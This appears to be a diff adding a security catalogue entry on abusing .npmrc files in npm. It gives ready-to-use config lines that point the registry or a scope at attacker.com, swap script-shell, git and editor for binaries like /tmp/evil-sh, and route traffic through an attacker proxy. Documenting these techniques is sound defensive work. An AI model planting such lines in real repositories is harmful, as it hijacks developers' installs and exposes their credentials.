@@ -1,0 +1,94 @@
+name: .npmrc Configuration Abuse
+id: npmrc
+description: >
+  .npmrc files configure npm behaviour at the project or user level. Attackers
+  can drop a malicious .npmrc in a repository to redirect package resolution to
+  a rogue registry, replace core binaries invoked by npm, or exfiltrate
+  credentials already stored in the file.
+author: LOC Team
+tags:
+  - npm
+  - code-execution
+  - supply-chain
+
+exploitation: |
+  npm reads `.npmrc` files in the project root, the user home directory, and
+  the global prefix. A repository-level `.npmrc` is the easiest place for an
+  attacker to plant malicious configuration because it is committed alongside
+  the code and applied automatically on every `npm` invocation.
+
+  ### Malicious registry (full redirect)
+
+  Redirect all package fetches to an attacker-controlled server. Every
+  `npm install` resolves packages from the rogue registry, which can serve
+  backdoored versions of any dependency.
+
+  ```ini
+  registry=https://attacker.com/npm/
+  ```
+
+  ### Per-scope registry (dependency confusion)
+
+  Override the registry only for a specific scope. Combined with a private
+  package name published to the public registry, this is the classic dependency
+  confusion vector.
+
+  ```ini
+  @mycompany:registry=https://attacker.com/npm/
+  ```
+
+  ### script-shell — swap the shell used to run lifecycle scripts
+
+  npm uses this shell to execute all `scripts` entries in `package.json`. Pointing
+  it at a malicious binary means every `npm run <cmd>` or install script spawns
+  the attacker's process.
+
+  ```ini
+  script-shell=/tmp/evil-sh
+  ```
+
+  ### shell — swap the shell used by `npm explore`
+
+  Replaces the interactive shell opened by `npm explore <pkg>`. Less commonly
+  triggered but still a code execution path.
+
+  ```ini
+  shell=/tmp/evil-sh
+  ```
+
+  ### git — swap the git binary
+
+  npm shells out to git for operations such as installing git-URL dependencies
+  and version tagging. A replaced binary is executed whenever npm needs git.
+
+  ```ini
+  git=/tmp/evil-git
+  ```
+
+  ### editor — swap the editor invoked by `npm edit` / `npm config edit`
+
+  When a developer runs `npm edit <pkg>` or `npm config edit`, npm opens the
+  configured editor. Pointing this at a malicious binary achieves code execution
+  on that interaction.
+
+  ```ini
+  editor=/tmp/evil-editor
+  ```
+
+  ### proxy / https-proxy — intercept all registry traffic
+
+  Routes all npm registry requests through an attacker-controlled proxy,
+  enabling MITM of package downloads, tarball tampering, and credential capture.
+
+  ```ini
+  proxy=http://attacker.com:8080
+  https-proxy=http://attacker.com:8080
+  ```
+
+references:
+  - url: https://docs.npmjs.com/cli/v11/configuring-npm/npmrc
+    description: Official npm .npmrc documentation
+  - url: https://docs.npmjs.com/cli/v11/using-npm/config
+    description: Full list of npm configuration keys
+  - url: https://blog.sonatype.com/dependency-confusion-how-i-hacked-into-apple-uber-and-airbnb
+    description: Dependency confusion attack via scoped registry override
